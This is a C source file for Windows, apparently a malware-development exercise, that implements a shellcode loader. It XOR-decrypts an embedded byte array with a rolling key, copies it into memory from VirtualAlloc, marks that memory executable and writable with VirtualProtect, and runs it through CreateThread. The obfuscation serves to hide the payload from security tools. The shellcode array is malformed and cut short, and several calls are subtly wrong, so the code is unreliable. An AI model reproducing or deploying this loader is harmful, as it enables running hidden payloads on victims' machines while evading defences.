#include <stdio.h>
#include <Windows.h>
#include <string.h>

VOID XorByiKeys(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ (bKey + i);
	}
}

unsigned char Shellcode[] = {
		0x0D, 0xBA, 0x70, 0x10, 0x05, 0x1E, 0x37, 0xF8, 0xF9, 0xFA, 0xBA, 0xAD, 0xBC, 0xAE, 0xAD, 0x51,
		0x57, 0x4A, 0x32, 0xD6, 0x60, 0x4E, 0x8C, 0x5A, 0x69, 0x42, 0x80, 0x5E, 0x15, 0x46, 0x84, 0x42,
		0x31, 0x5A, 0x98, 0x66, 0x45, 0x5E, 0x18, 0xAF, 0x53, 0x50, 0x56, 0x2D, 0xD4, 0x56, 0x2E, 0xE0,
		0x8D, 0x1E, 0x42, 0x58, 0x27, 0x0A, 0x07, 0x69, 0xE8, 0xE3, 0x26, 0x6D, 0x2C, 0xEF, 0xCD, 0xDD,
		0x63, 0x73, 0x62, 0x7C, 0xBE, 0x64, 0x17, 0xB3, 0x7B, 0x06, 0x73, 0x3D, 0xED, 0xB5, 0xBF, 0xC8,
		0x41, 0x42, 0x43, 0x0C, 0xC0, 0x86, 0x33, 0x2F, 0x01, 0x4B, 0x9B, 0x1C, 0xC6, 0x06, 0x57, 0x14,
		0xDA, 0x12, 0x73, 0x1D, 0x54, 0x	86,  };


int main() {
	printf("---[i] Decrypting XOR Shellcode in current proccess -> %d\n", GetCurrentProcessId());
	printf("Press enter to decrypt...");
	getchar();

	printf("---[i] Decrypting\n");
	XorByiKeys(&Shellcode, sizeof(Shellcode), 0xF1);
	printf("---[i] Decrypted to %p\n", &Shellcode);

	printf("---[i] Allocating memory\nPress enter to allocate memory...");
	getchar();
	PVOID pAllocatedShellcode = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("---[i] Memory allocated at: %p\n", pAllocatedShellcode);

	printf("---[i] Writing shellcode to allocated memory\nPress enter to write to memory...");
	memcpy(pAllocatedShellcode, &Shellcode, sizeof(Shellcode));
	getchar();

	printf("---[i] Cleaning up old shellcode at: %p\n", &Shellcode);
	char* emptyString[sizeof(Shellcode)];
	memset(&Shellcode, "\0", sizeof(Shellcode));

	DWORD lpLastProtect = NULL;

	printf("---[i] Changing memory protection\nPress enter to change memory protection...");
	VirtualProtect(pAllocatedShellcode, sizeof(Shellcode), PAGE_EXECUTE_READWRITE, &lpLastProtect);

	getchar();
	
	printf("---[i] Creating thread to execute shellcode\nPress enter to run shellcode....");
	getchar();
	CreateThread(NULL, NULL, pAllocatedShellcode, NULL, NULL, NULL);

   
	printf("Press enter to close");
    getchar();

	return 0;
}